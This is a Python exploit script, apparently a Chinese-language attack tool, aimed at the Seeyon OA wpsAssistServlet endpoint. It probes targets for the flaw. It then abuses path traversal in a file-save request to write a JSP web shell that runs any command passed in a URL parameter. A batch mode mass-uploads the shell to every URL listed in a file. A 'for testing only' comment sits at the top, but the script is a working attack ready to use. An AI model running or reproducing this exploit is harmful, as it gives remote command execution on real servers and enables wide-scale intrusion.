#工具仅供测试
import requests
import optparse
import re
import urllib

parse = optparse.OptionParser()
parse.add_option("-v","--vuln",action="store",type="string",help="漏洞探测！！！",dest="Vulnerability",metavar="Vulnerability")
parse.add_option("-u","--url",action="store",type="string",help="漏洞利用！！！",dest="uploadfile",metavar="UPLOADFILE")
parse.add_option("-d","--data",action="store",type="string",help="上传的文件名字！！！",dest="filename",metavar="FileName")
parse.add_option("-f","--file",action="store",type="string",help="文件名字！！！",dest="file",metavar="File")

(options,args) = parse.parse_args()
vuln = options.Vulnerability
url = options.uploadfile
filename = options.filename
file = options.file

Trojans = "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>"

#漏洞探测
def Vulnerability(vuln):
    url = requests.get(url=vuln+"seeyon/wpsAssistServlet")
    content = str(url.content)
    pattern = re.compile(r'(?:\"code\":\")([^\"]+)', re.M)
    data = pattern.findall(content)
    pattern = re.compile(r'(?:\"data\":\")([^\"]+)', re.M)
    data1 = pattern.findall(content)
    if data[0] == "1000" and data1[0] == "flag is empty\\xef\\xbc\\x81":
        print("存在漏洞:" + url.url + "seeyon/wpsAssistServlet")
    else:
        print("不存在漏洞")
#漏洞利用
def uploadfiles(url,filename,exp):
    vule = "seeyon/wpsAssistServlet"
    urldata = f"?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{filename}&fileId=2"
    headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)",
         "Accept-Encoding": "gzip, deflate",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
         "Connection": "close",
         "Upgrade-Insecure-Requests": "1",
         "Content-Type": "multipart/form-data;boundary=59229605f98b8cf290a7b8908b34616b",

    }

    data = f'''--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name="upload"; filename="1.xls"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n{exp}\r\n--59229605f98b8cf290a7b8908b34616b--\r\n'''



    r = requests.post(url=url + vule + urldata,headers=headers,data=data,verify=False,timeout=5)
    content = str(r.content)
    pattern = re.compile(r'(?:\"officeTransResultFlag\":\")([^\"]+)', re.M)
    data = pattern.findall(content)
    # print(data) #测试代码
    if data[0] == "N":
        print("上传成功:" + url  + filename)
    else:
        print("上传失败")
def BatchUoloadfile(filename,exp,file):
    vule = "seeyon/wpsAssistServlet"
    urldata = f"?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{filename}&fileId=2"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data;boundary=59229605f98b8cf290a7b8908b34616b",

    }
    data = f'''--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name="upload"; filename="1.xls"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n{exp}\r\n--59229605f98b8cf290a7b8908b34616b--\r\n'''
    with open(file) as f:
        file = f.readlines()
        for line in file:
            urltest = line.strip()
            # print(urltest + vule + urldata)
            r = requests.post(url=urltest + vule + urldata, headers=headers, data=data, verify=False, timeout=5)
            content = str(r.content)
            # print(content)
            pattern = re.compile(r'(?:\"officeTransResultFlag\":\")([^\"]+)', re.M)
            datafile = pattern.findall(content)
            # print(datafile) #测试代码
            if datafile[0] == "N":
                print("上传成功:" + urltest + filename)
            else:
                print("上传失败")
if vuln !=None:
    Vulnerability(vuln)
elif url !=None and filename !=None:
    uploadfiles(url,filename,Trojans)
elif filename !=None and file !=None:
    BatchUoloadfile(filename, Trojans, file)
else:
    print("请输入正确的参数")

